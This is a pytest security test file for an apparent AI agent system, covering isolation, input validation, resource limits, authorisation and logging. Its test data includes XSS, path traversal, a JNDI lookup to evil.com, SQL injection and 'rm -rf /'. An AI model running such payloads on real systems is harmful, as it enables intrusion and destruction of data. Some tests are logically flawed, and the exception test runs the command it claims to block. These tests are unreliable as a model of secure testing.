"""
Security Tests for Windows AI Agent System
Tests agent execution security, task isolation, and multi-agent coordination security.
"""

import asyncio
import pytest
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime

# Import agent system
try:
    from windows_ai.agents.agent import Agent, AgentStatus
    from windows_ai.agents.agent_manager import AgentManager
    from windows_ai.agents.task import Task, TaskStatus, TaskPriority
except ImportError:
    pytest.skip("Agent system not available", allow_module_level=True)


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def agent_manager():
    """Create an agent manager instance"""
    manager = AgentManager()
    return manager


@pytest.fixture
async def test_agent(agent_manager):
    """Create a test agent"""
    agent = await agent_manager.create_agent(
        name="test_agent",
        capabilities=["data_processing"],
        available_plugins=["test_plugin"]
    )
    return agent


@pytest.fixture
def malicious_task():
    """Create a task with malicious intent"""
    return Task(
        name="malicious_task",
        description="Try to escape sandbox and access system",
        required_capabilities=["system_access"],
        priority=TaskPriority.HIGH
    )


@pytest.fixture
def safe_task():
    """Create a safe task"""
    return Task(
        name="safe_task",
        description="Process some data safely",
        required_capabilities=["data_processing"],
        priority=TaskPriority.NORMAL
    )


# ============================================================================
# Test: Agent Isolation
# ============================================================================

class TestAgentIsolation:
    """Test agent isolation and sandboxing"""
    
    @pytest.mark.asyncio
    async def test_agent_memory_isolation(self, agent_manager):
        """Agents should have isolated memory spaces"""
        agent1 = await agent_manager.create_agent(
            name="agent1",
            capabilities=["task1"]
        )
        agent2 = await agent_manager.create_agent(
            name="agent2",
            capabilities=["task2"]
        )
        
        # Agent 1 sets some data
        agent1.memory = {"secret": "agent1_data"}
        
        # Agent 2 should not be able to access agent1's memory
        assert agent2.memory.get("secret") != "agent1_data"
        assert "secret" not in agent2.memory
    
    @pytest.mark.asyncio
    async def test_agent_cannot_modify_other_agents(self, agent_manager, test_agent):
        """Agents should not be able to modify other agents"""
        agent2 = await agent_manager.create_agent(
            name="agent2",
            capabilities=["admin"]
        )
        
        original_status = test_agent.status
        
        # Agent2 tries to modify test_agent
        with pytest.raises((AttributeError, PermissionError)):
            # Should not be allowed
            agent2._modify_other_agent(test_agent)
        
        # test_agent should be unchanged
        assert test_agent.status == original_status
    
    @pytest.mark.asyncio
    async def test_agent_plugin_access_restricted(self, agent_manager):
        """Agents should only access plugins they're authorized for"""
        agent = await agent_manager.create_agent(
            name="restricted_agent",
            capabilities=["data"],
            available_plugins=["safe_plugin"]
        )
        
        # Try to access unauthorized plugin
        with pytest.raises((PermissionError, KeyError)):
            await agent._execute_plugin("dangerous_plugin", "action", {})


# ============================================================================
# Test: Task Validation
# ============================================================================

class TestTaskValidation:
    """Test task input validation and sanitization"""
    
    @pytest.mark.asyncio
    async def test_task_description_sanitized(self, agent_manager, test_agent):
        """Task descriptions should be sanitized"""
        malicious_descriptions = [
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE tasks; --",
        ]
        
        for desc in malicious_descriptions:
            task = Task(
                name="test",
                description=desc,
                required_capabilities=["data_processing"]
            )
            
            # Should sanitize or reject
            await agent_manager.assign_task(task)
            
            # Task description should be sanitized
            assert task.description != desc or \
                   not any(char in task.description for char in ["<", ">", ";", "$"])
    
    @pytest.mark.asyncio
    async def test_task_parameters_validated(self, test_agent):
        """Task parameters should be validated"""
        task = Task(
            name="test",
            description="test",
            required_capabilities=["data_processing"],
            parameters={
                "path": "../../../sensitive_file",
                "command": "rm -rf /",
                "sql": "DROP TABLE users"
            }
        )
        
        # Should validate and reject dangerous parameters
        with pytest.raises(ValueError):
            await test_agent.execute_task(task)
    
    def test_task_priority_enforced(self):
        """Task priority should be enforced"""
        high_task = Task(
            name="high",
            description="high priority",
            priority=TaskPriority.CRITICAL
        )
        low_task = Task(
            name="low",
            description="low priority",
            priority=TaskPriority.LOW
        )
        
        # High priority should be > low priority
        assert high_task.priority.value > low_task.priority.value


# ============================================================================
# Test: Resource Limits
# ============================================================================

class TestResourceLimits:
    """Test resource limit enforcement"""
    
    @pytest.mark.asyncio
    async def test_agent_cpu_limit(self, agent_manager, test_agent):
        """Agent CPU usage should be limited"""
        # Create CPU-intensive task
        task = Task(
            name="cpu_intensive",
            description="Calculate primes",
            required_capabilities=["compute"]
        )
        
        # Mock CPU monitoring
        with patch('psutil.Process') as mock_process:
            mock_process.return_value.cpu_percent.return_value = 95.0  # Over limit
            
            # Should throttle or reject
            with pytest.raises((ResourceWarning, TimeoutError)):
                await test_agent.execute_task(task)
    
    @pytest.mark.asyncio
    async def test_agent_memory_limit(self, test_agent):
        """Agent memory usage should be limited"""
        # Task that tries to allocate too much memory
        task = Task(
            name="memory_hog",
            description="Allocate 10GB",
            required_capabilities=["data_processing"],
            parameters={"size": "10GB"}
        )
        
        # Should fail before actually allocating
        with pytest.raises((MemoryError, ValueError)):
            await test_agent.execute_task(task)
    
    @pytest.mark.asyncio
    async def test_task_timeout_enforced(self, test_agent):
        """Tasks should timeout after max duration"""
        # Long-running task
        task = Task(
            name="long_task",
            description="Run forever",
            required_capabilities=["data_processing"]
        )
        task.timeout = 1.0  # 1 second timeout
        
        # Mock long execution
        async def slow_execute(*args):
            await asyncio.sleep(10)
            return {}
        
        with patch.object(test_agent, '_execute_with_plugins', slow_execute):
            with pytest.raises(asyncio.TimeoutError):
                await test_agent.execute_task(task)
    
    @pytest.mark.asyncio
    async def test_concurrent_task_limit(self, agent_manager, test_agent):
        """Agent should limit concurrent tasks"""
        # Create many tasks
        tasks = [
            Task(
                name=f"task_{i}",
                description=f"Task {i}",
                required_capabilities=["data_processing"]
            )
            for i in range(20)
        ]
        
        # Try to execute all at once
        results = await asyncio.gather(
            *[test_agent.execute_task(task) for task in tasks],
            return_exceptions=True
        )
        
        # Some should be rejected due to concurrency limit
        errors = [r for r in results if isinstance(r, Exception)]
        assert len(errors) > 0


# ============================================================================
# Test: Agent Authentication & Authorization
# ============================================================================

class TestAgentAuth:
    """Test agent authentication and authorization"""
    
    @pytest.mark.asyncio
    async def test_agent_requires_authentication(self, agent_manager):
        """Agents should require authentication token"""
        # Try to create agent without auth
        with patch.dict('os.environ', {}, clear=True):
            with pytest.raises((PermissionError, ValueError)):
                await agent_manager.create_agent(
                    name="unauthorized",
                    capabilities=["admin"]
                )
    
    @pytest.mark.asyncio
    async def test_agent_capability_authorization(self, agent_manager):
        """Agents should only perform authorized capabilities"""
        agent = await agent_manager.create_agent(
            name="limited_agent",
            capabilities=["data_processing"]
        )
        
        # Try to execute task requiring unauthorized capability
        admin_task = Task(
            name="admin_task",
            description="Admin operation",
            required_capabilities=["system_admin"]
        )
        
        with pytest.raises(PermissionError):
            await agent.execute_task(admin_task)
    
    @pytest.mark.asyncio
    async def test_agent_cannot_escalate_privileges(self, test_agent):
        """Agents should not be able to escalate their privileges"""
        original_capabilities = test_agent.capabilities.copy()
        
        # Try to add new capability
        with pytest.raises((AttributeError, PermissionError)):
            test_agent.capabilities.append("system_admin")
            test_agent._grant_capability("system_admin")
        
        # Capabilities should be unchanged
        assert test_agent.capabilities == original_capabilities


# ============================================================================
# Test: Inter-Agent Communication Security
# ============================================================================

class TestInterAgentSecurity:
    """Test security of agent-to-agent communication"""
    
    @pytest.mark.asyncio
    async def test_agent_messages_authenticated(self, agent_manager):
        """Messages between agents should be authenticated"""
        agent1 = await agent_manager.create_agent(name="agent1", capabilities=["task1"])
        agent2 = await agent_manager.create_agent(name="agent2", capabilities=["task2"])
        
        # Agent1 sends message to agent2
        message = {"type": "request", "data": "sensitive_data"}
        
        # Should include authentication
        with patch.object(agent1, 'send_message') as mock_send:
            await agent1.send_message(agent2.id, message)
            
            # Verify authentication was added
            call_args = mock_send.call_args
            assert 'signature' in call_args[0] or 'auth_token' in call_args[0]
    
    @pytest.mark.asyncio
    async def test_agent_message_tampering_detected(self, agent_manager):
        """Tampered messages should be detected and rejected"""
        agent1 = await agent_manager.create_agent(name="agent1", capabilities=["task1"])
        agent2 = await agent_manager.create_agent(name="agent2", capabilities=["task2"])
        
        # Send message with tampered signature
        message = {
            "type": "command",
            "data": "malicious_command",
            "signature": "invalid_signature"
        }
        
        # Should reject tampered message
        with pytest.raises((ValueError, SecurityError)):
            await agent2.receive_message(agent1.id, message)
    
    @pytest.mark.asyncio
    async def test_agent_message_replay_prevented(self, agent_manager):
        """Message replay attacks should be prevented"""
        agent1 = await agent_manager.create_agent(name="agent1", capabilities=["task1"])
        agent2 = await agent_manager.create_agent(name="agent2", capabilities=["task2"])
        
        # Send a message
        message = {"type": "request", "data": "data", "timestamp": datetime.now().isoformat()}
        await agent1.send_message(agent2.id, message)
        
        # Try to replay the same message
        with pytest.raises((ValueError, SecurityError)):
            await agent1.send_message(agent2.id, message)


# ============================================================================
# Test: Task Dependency Security
# ============================================================================

class TestTaskDependencySecurity:
    """Test security of task dependencies"""
    
    @pytest.mark.asyncio
    async def test_circular_dependency_prevented(self, agent_manager):
        """Circular task dependencies should be prevented"""
        task1 = Task(name="task1", description="Task 1")
        task2 = Task(name="task2", description="Task 2")
        
        # Create circular dependency
        task1.dependencies = [task2.id]
        task2.dependencies = [task1.id]
        
        # Should detect and prevent
        with pytest.raises(ValueError):
            await agent_manager.assign_task(task1)
            await agent_manager.assign_task(task2)
    
    @pytest.mark.asyncio
    async def test_dependency_chain_depth_limited(self, agent_manager):
        """Task dependency chains should have depth limit"""
        tasks = []
        for i in range(100):
            task = Task(
                name=f"task_{i}",
                description=f"Task {i}",
                dependencies=[tasks[-1].id] if tasks else []
            )
            tasks.append(task)
        
        # Should reject overly deep chains
        with pytest.raises(ValueError):
            for task in tasks:
                await agent_manager.assign_task(task)


# ============================================================================
# Test: Audit Logging
# ============================================================================

class TestAgentAuditLogging:
    """Test agent audit logging"""
    
    @pytest.mark.asyncio
    async def test_agent_creation_logged(self, agent_manager, caplog):
        """Agent creation should be logged"""
        await agent_manager.create_agent(
            name="logged_agent",
            capabilities=["test"]
        )
        
        # Check logs
        log_messages = [r.message for r in caplog.records]
        assert any("created" in msg.lower() and "agent" in msg.lower() 
                  for msg in log_messages)
    
    @pytest.mark.asyncio
    async def test_task_execution_logged(self, test_agent, safe_task, caplog):
        """Task executions should be logged with details"""
        await test_agent.execute_task(safe_task)
        
        # Check logs contain task details
        log_messages = [r.message for r in caplog.records]
        assert any(safe_task.name in msg for msg in log_messages)
    
    @pytest.mark.asyncio
    async def test_security_violations_logged(self, test_agent, malicious_task, caplog):
        """Security violations should be prominently logged"""
        try:
            await test_agent.execute_task(malicious_task)
        except Exception:
            pass
        
        # Check for security-related log entries
        log_messages = [r.message for r in caplog.records]
        assert any("security" in msg.lower() or "violation" in msg.lower() 
                  for msg in log_messages)


# ============================================================================
# Test: Agent State Security
# ============================================================================

class TestAgentStateSecurity:
    """Test agent state management security"""
    
    @pytest.mark.asyncio
    async def test_agent_state_not_leaked(self, test_agent):
        """Agent internal state should not be exposed"""
        # Get agent info
        info = test_agent.get_info()
        
        # Should not contain sensitive internal state
        assert '_internal' not in info
        assert '_private' not in str(info).lower()
        assert 'password' not in str(info).lower()
        assert 'api_key' not in str(info).lower()
    
    @pytest.mark.asyncio
    async def test_agent_state_serialization_safe(self, test_agent):
        """Agent state serialization should be safe"""
        import json
        
        # Serialize agent state
        state = test_agent.get_state()
        serialized = json.dumps(state)
        
        # Should not contain executable code
        assert '<script>' not in serialized
        assert '__import__' not in serialized
        assert 'eval(' not in serialized


# ============================================================================
# Test: Error Handling Security
# ============================================================================

class TestErrorHandlingSecurity:
    """Test secure error handling"""
    
    @pytest.mark.asyncio
    async def test_errors_dont_leak_internals(self, test_agent):
        """Error messages should not leak internal details"""
        task = Task(
            name="failing_task",
            description="This will fail",
            required_capabilities=["nonexistent"]
        )
        
        try:
            await test_agent.execute_task(task)
        except Exception as e:
            error_msg = str(e)
            
            # Should not leak file paths, stack traces, etc.
            assert not any(path in error_msg for path in ['/home/', 'C:\\', '/etc/'])
            assert 'Traceback' not in error_msg
    
    @pytest.mark.asyncio
    async def test_exception_handling_secure(self, test_agent):
        """Exception handling should be secure"""
        # Malicious exception that tries to execute code
        class MaliciousException(Exception):
            def __str__(self):
                import os
                os.system("echo pwned")
                return "malicious"
        
        # Should handle safely
        try:
            raise MaliciousException()
        except Exception as e:
            # Should not execute the code
            str_result = str(e)
            assert str_result  # Should return something safe


# ============================================================================
# Run Tests
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])
